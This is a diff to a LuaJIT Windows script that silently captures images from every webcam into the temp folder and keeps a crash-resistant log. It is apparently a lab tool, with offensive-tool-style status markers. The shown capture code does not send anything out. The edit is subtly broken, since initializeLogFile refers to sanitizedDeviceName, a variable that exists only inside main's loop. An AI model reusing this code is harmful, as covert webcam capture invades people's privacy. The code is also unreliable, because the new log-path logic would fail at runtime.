@@ -27,6 +27,7 @@ typedef DWORD* LPDWORD;
 // File operations
 HANDLE CreateFileA(LPCSTR, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);
 BOOL WriteFile(HANDLE, const void*, DWORD, LPDWORD, void*);
+BOOL FlushFileBuffers(HANDLE);
 BOOL CloseHandle(HANDLE);
 DWORD GetTempPathA(DWORD, LPSTR);
 DWORD GetComputerNameA(LPSTR, LPDWORD);
@@ -76,6 +77,7 @@ local kernel32 = ffi.load("kernel32")
 local GENERIC_WRITE = 0x40000000
 local CREATE_ALWAYS = 2
 local FILE_ATTRIBUTE_NORMAL = 0x80
+local FILE_FLAG_WRITE_THROUGH = 0x80000000  -- Immediate disk write, no buffering
 local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", ffi.cast("intptr_t", -1))
 
 local WS_CHILD = 0x40000000
@@ -112,7 +114,7 @@ local function initializeLogFile()
         local tempPath = getTempPath()
         local computerName = getComputerName()
         local timestamp = os.date("%Y%m%d_%H%M%S")
-        local logPath = string.format("%s%s_WEBCAM_PICTURE_%s.log", tempPath, computerName, timestamp)
+        local logPath = string.format("%sWIN11LAB_WEBCAM_PICTURE_%s_%s.log", tempPath, sanitizedDeviceName, timestamp)
         
         LOG_HANDLE = kernel32.CreateFileA(
             logPath,
@@ -120,7 +122,7 @@ local function initializeLogFile()
             0,
             nil,
             CREATE_ALWAYS,
-            FILE_ATTRIBUTE_NORMAL,
+            FILE_FLAG_WRITE_THROUGH,  -- Write through, no caching
             nil
         )
         
@@ -144,7 +146,11 @@ local function log(message)
             local timestamp = os.date("%Y-%m-%d %H:%M:%S")
             local logLine = string.format("[%s] %s\n", timestamp, message)
             local written = ffi.new("DWORD[1]")
-            kernel32.WriteFile(LOG_HANDLE, logLine, #logLine, written, nil)
+            local result = kernel32.WriteFile(LOG_HANDLE, logLine, #logLine, written, nil)
+            -- Immediately flush to disk to ensure data is written even if process terminates
+            if result ~= 0 then
+                kernel32.FlushFileBuffers(LOG_HANDLE)
+            end
         end
     end)
 end
@@ -271,16 +277,17 @@ local function main()
     local tempPath = getTempPath()
     for _, device in ipairs(devices) do
         local timestamp = os.date("%Y%m%d_%H%M%S")
-        local sanitizedName = device.name:gsub("[^%w%s%-_]", "_"):gsub("%s+", "_")
-        local outputPath = string.format("%swebcam_%d_%s_%s.bmp", tempPath, device.index, sanitizedName, timestamp)
+        local sanitizedDeviceName = device.name:gsub("[^%w%s%-_]", "_"):gsub("%s+", "_")
+        local logPath = string.format("%sWIN11LAB_WEBCAM_PICTURE_%s_%s.log", tempPath, sanitizedDeviceName, timestamp)
+        local outputPath = string.format("%s.bmp", logPath:match("(.-)%.log$"))
         
         log(string.format("[*] Processing device %d: %s", device.index, device.name))
         local result = captureFromDevice(device.index, outputPath)
         
         if result then
-            log(string.format("[✓] Successfully captured from %s", device.name))
+            log(string.format("[+] Successfully captured from %s", device.name))
         else
-            log(string.format("[✗] Failed to capture from %s", device.name))
+            log(string.format("[-] Failed to capture from %s", device.name))
         end
         
         log("")
